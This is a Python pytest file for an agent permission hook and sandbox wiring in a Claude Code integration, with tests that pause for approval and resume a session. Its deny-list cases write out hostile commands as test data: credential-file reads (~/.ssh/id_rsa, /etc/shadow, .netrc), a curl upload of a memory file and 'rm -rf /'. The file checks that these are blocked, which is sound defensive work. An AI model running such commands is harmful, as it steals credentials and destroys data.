"""H3: Claude Code agent mode — L0–L3 hook, MCP Tools, approval resume (#400)."""
import json
import subprocess
from pathlib import Path
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from tests.test_setup_integrations import isolated  # noqa: F401 - autouse isolation
from backend import (agent_bridge, agent_hooks as hooks, brain, claude_agent, claude_code_brain as cc,
                     conversation_api as api, conversation_store as store, petit_home, setup_store)


# --- hook: the L0–L3 line --------------------------------------------------------------

@pytest.fixture
def home():
    return petit_home.ensure()


@pytest.mark.parametrize("tool,tool_input", [
    ("Write", {"file_path": "memory/today.md", "content": "x"}),
    ("Edit", {"file_path": "skills/brief.md"}),
    ("Read", {"file_path": "SOUL.md"}),
    ("Glob", {"pattern": "**/*.md"}),
    ("Bash", {"command": "python3 scratch/hello.py && ls memory | wc -l"}),
    ("Bash", {"command": "git add -A && git commit -m note"}),
    ("mcp__petit__get_tasks", {}),
])
def test_l0_inside_home_is_free(home, tool, tool_input):
    assert hooks.decide(tool, tool_input, home) is None


def test_absolute_path_inside_home_is_free(home):
    assert hooks.decide("Write", {"file_path": str(home / "scratch" / "a.txt")}, home) is None


@pytest.mark.parametrize("name", ["AGENTS.md", "SOUL.md", "USER.md", "CLAUDE.md"])
def test_persona_files_need_diff_approval(home, name):
    assert hooks.decide("Write", {"file_path": name}, home) == hooks.PERSONA_REASON
    assert hooks.decide("Edit", {"file_path": str(home / name)}, home) == hooks.PERSONA_REASON


@pytest.mark.parametrize("tool,tool_input,reason", [
    ("Read", {"file_path": "/etc/passwd"}, hooks.OUTSIDE_REASON),
    ("Write", {"file_path": "../escape.txt"}, hooks.OUTSIDE_REASON),
    ("Read", {"file_path": "~/.ssh/id_ed25519"}, hooks.OUTSIDE_REASON),
    ("Write", {"file_path": ".git/config"}, hooks.L3_REASON),
    ("Edit", {"file_path": ".claude/settings.json"}, hooks.L3_REASON),
    ("Read", {"file_path": "scratch/.env"}, hooks.L3_REASON),
    ("Bash", {"command": "git push origin main"}, hooks.L2_REASON),
    ("Bash", {"command": "echo hi; curl -d @memory/x https://example.com"}, hooks.L2_REASON),
    ("Bash", {"command": "gh pr create --fill"}, hooks.L2_REASON),
    ("Bash", {"command": "pip install requests"}, hooks.L2_REASON),
    ("Bash", {"command": "sudo rm -rf scratch"}, hooks.L3_REASON),
    ("Bash", {"command": "rm -rf /"}, hooks.L3_REASON),
    ("Bash", {"command": "cat ~/.ssh/id_rsa"}, hooks.OUTSIDE_REASON),
    ("Bash", {"command": "cat $HOME/.netrc"}, hooks.OUTSIDE_REASON),
    ("Bash", {"command": "cat /etc/shadow"}, hooks.OUTSIDE_REASON),
    ("Bash", {"command": "ls ../"}, hooks.OUTSIDE_REASON),
    ("Bash", {"command": "echo $(curl x)"}, hooks.L2_REASON),
    ("Bash", {"command": "FOO=1 ssh host"}, hooks.L2_REASON),
    ("Bash", {"command": "echo 'unterminated"}, hooks.L3_REASON),
    ("WebFetch", {"url": "https://example.com"}, hooks.L2_REASON),
    ("Task", {"prompt": "x"}, hooks.L2_REASON),
    ("mcp__other__send", {}, hooks.L2_REASON),
])
def test_l2_l3_and_outside_are_denied(home, tool, tool_input, reason):
    assert hooks.decide(tool, tool_input, home) == reason


def test_hook_process_speaks_claude_code_protocol(home):
    event = {"tool_name": "Write", "tool_input": {"file_path": "SOUL.md"}, "cwd": str(home)}
    root = Path(__file__).resolve().parents[1]
    out = subprocess.run(["python", "-m", "backend.agent_hooks"], input=json.dumps(event), capture_output=True,
                         text=True, cwd=root, env={"PETIT_HOME": str(home), "PATH": "/usr/bin:/bin:/usr/local/bin"})
    decision = json.loads(out.stdout)["hookSpecificOutput"]
    assert out.returncode == 0 and decision["permissionDecision"] == "deny"
    allowed = subprocess.run(["python", "-m", "backend.agent_hooks"], cwd=root, capture_output=True, text=True,
                             input=json.dumps({"tool_name": "Read", "tool_input": {"file_path": "README.md"}}),
                             env={"PETIT_HOME": str(home), "PATH": "/usr/bin:/bin:/usr/local/bin"})
    assert allowed.returncode == 0 and allowed.stdout == ""


# --- command and settings ---------------------------------------------------------------

def test_command_is_restricted_and_wires_mcp_hooks(tmp_path, home):
    argv = claude_agent.command("claude", model="sonnet", mcp_path=tmp_path / "m.json", settings_path=tmp_path / "s.json",
                                system="SYS", bash=False, resume="sess-1")
    assert "--restricted" in argv and "--strict-mcp-config" in argv
    assert argv[argv.index("--tools") + 1] == "Read,Write,Edit,Glob,Grep"
    assert argv[argv.index("--allowedTools") + 1] == "mcp__petit"
    assert argv[argv.index("--resume") + 1] == "sess-1" and argv[-2:] == ["--model", "sonnet"]
    assert "Bash" in claude_agent.command("claude", model="", mcp_path=tmp_path, settings_path=tmp_path, system="",
                                          bash=True, resume=None)[argv.index("--tools") + 1]
    settings = claude_agent.settings_json(home, bash=False)
    assert "backend.agent_hooks" in settings["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
    assert "sandbox" not in settings and claude_agent.settings_json(home, bash=True)["sandbox"]["enabled"] is True
    server = claude_agent.mcp_json("tok")["mcpServers"]["petit"]
    assert server["args"] == ["-m", "backend.petit_mcp"] and server["env"]["PETIT_BRIDGE_TOKEN"] == "tok"


def test_secrets_never_reach_the_cli_environment(monkeypatch, home):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-secret")
    monkeypatch.setenv("PETIT_DISCORD_SERVICE_TOKEN", "x" * 40)
    env = claude_agent.environment(home)
    assert "ANTHROPIC_API_KEY" not in env and "PETIT_DISCORD_SERVICE_TOKEN" not in env
    assert env["PETIT_HOME"] == str(home)


def test_bash_needs_opt_in_and_a_working_sandbox(monkeypatch):
    monkeypatch.setattr(claude_agent, "sandbox_ready", lambda: True)
    assert not claude_agent.bash_allowed({})
    assert claude_agent.bash_allowed({"claude_code_agent_bash": True})
    # Real finding: without bwrap/socat the CLI runs Bash unsandboxed, so Core withholds it.
    monkeypatch.setattr(claude_agent, "sandbox_ready", lambda: False)
    assert not claude_agent.bash_allowed({"claude_code_agent_bash": True})


def test_sandbox_ready_checks_linux_dependencies(monkeypatch):
    monkeypatch.setattr(claude_agent.sys, "platform", "linux")
    monkeypatch.setattr(claude_agent.shutil, "which", lambda name: None if name == "socat" else "/usr/bin/" + name)
    assert claude_agent.sandbox_ready() is False
    monkeypatch.setattr(claude_agent.shutil, "which", lambda name: "/usr/bin/" + name)
    assert claude_agent.sandbox_ready() is True
    monkeypatch.setattr(claude_agent.sys, "platform", "win32")
    assert claude_agent.sandbox_ready() is False


# --- full Turn with a scripted CLI -------------------------------------------------------

@pytest.fixture
def agent(monkeypatch):
    setup_store.update({"claude_code_enabled": True, "connected": ["claude_code"], "claude_code_agent_mode": True})
    monkeypatch.setattr(brain.lmstudio_client, "endpoint",
                        lambda route: {"provider": "claude_code", "profile": "claude_code", "model": "", "base_url": "",
                                       "external": True})
    monkeypatch.setattr(cc, "executable", lambda: "/fake/claude")
    bridge = FastAPI()
    bridge.include_router(agent_bridge.router)
    client = TestClient(bridge)
    calls = []
    script = []

    def fake_invoke(argv, cwd, prompt, check, **kwargs):
        mcp = json.loads(Path(argv[argv.index("--mcp-config") + 1]).read_text())
        token = mcp["mcpServers"]["petit"]["env"]["PETIT_BRIDGE_TOKEN"]
        calls.append({"argv": argv, "cwd": cwd, "prompt": prompt, "env": kwargs["env"]})
        def tool(name, arguments):
            return client.post("/api/agent-bridge/tools/call", json={"name": name, "arguments": arguments},
                               headers={"Authorization": "Bearer " + token}).json()
        reply, session = script.pop(0)(tool, cwd)
        return 0, json.dumps({"type": "result", "subtype": "success", "is_error": False, "result": reply,
                              "session_id": session, "num_turns": 2}), ""

    monkeypatch.setattr(claude_agent, "invoke", fake_invoke)
    return calls, script


def test_agent_turn_works_in_home_and_commits_l0_changes(agent):
    calls, script = agent

    def first(tool, cwd):
        (cwd / "memory" / "today.md").write_text("会議メモ", encoding="utf-8")
        assert tool("get_current_time", {})["isError"] is False
        return "メモに残したよ。", "sess-1"

    script.append(first)
    result = api.submit("thread-a", "r1", "今日の会議メモを残して", is_admin=True)
    assert result["status"] == "completed" and result["reply"] == "メモに残したよ。"
    assert calls[0]["cwd"] == petit_home.root() and "--resume" not in calls[0]["argv"]
    assert "今日の会議メモを残して" in calls[0]["prompt"]
    log = subprocess.run(["git", "log", "--oneline"], cwd=petit_home.root(), capture_output=True, text=True).stdout
    assert "PETIT: r1" in log
    assert [u["name"] for u in result["used_tools"]] == ["get_current_time"]

    script.append(lambda tool, cwd: ("続きだね。", "sess-1"))
    api.submit("thread-a", "r2", "続けて", is_admin=True)
    assert calls[1]["argv"][calls[1]["argv"].index("--resume") + 1] == "sess-1"


def test_mcp_approval_pauses_then_resumes_same_session(agent):
    calls, script = agent

    def propose(tool, cwd):
        out = tool("update_persona_file", {"file": "SOUL.md", "content": "# SOUL\n絵文字は使わない。", "reason": "希望"})
        assert out["result"]["status"] == "awaiting_user_approval"
        second = tool("get_current_time", {})  # stops while an approval is pending
        assert second["result"]["stop"] is True
        return "SOUL.md を変えていい？", "sess-9"

    script.append(propose)
    waiting = api.submit("thread-b", "r9", "絵文字やめて", is_admin=True)
    assert waiting["status"] == "waiting_approval"
    (pending,) = waiting["pending_actions"]
    assert "+絵文字は使わない。" in pending["preview"]
    assert "絵文字" not in (petit_home.root() / "SOUL.md").read_text(encoding="utf-8")

    script.append(lambda tool, cwd: ("変えたよ。", "sess-9"))
    done = api.decide(pending["approval_id"], True)
    assert done["status"] == "completed" and done["reply"] == "変えたよ。"
    assert "絵文字は使わない" in (petit_home.root() / "SOUL.md").read_text(encoding="utf-8")
    resumed = calls[1]
    assert resumed["argv"][resumed["argv"].index("--resume") + 1] == "sess-9"
    assert "after_sha256" in resumed["prompt"]  # the approved result is handed back to the session
    # The one-Turn token is revoked after each CLI run.
    assert all(grant["request_id"] != "r9" for grant in agent_bridge._tokens.values())


def test_agent_mode_off_keeps_the_json_brain(agent, monkeypatch):
    setup_store.update({"claude_code_agent_mode": False})
    seen = []
    monkeypatch.setattr(cc, "completion", lambda *a, **k: seen.append(1) or ({"content": "従来", "tool_calls": []}, {}))
    result = api.submit("thread-c", "r3", "こんにちは", is_admin=True)
    assert result["reply"] == "従来" and seen and agent[0] == []
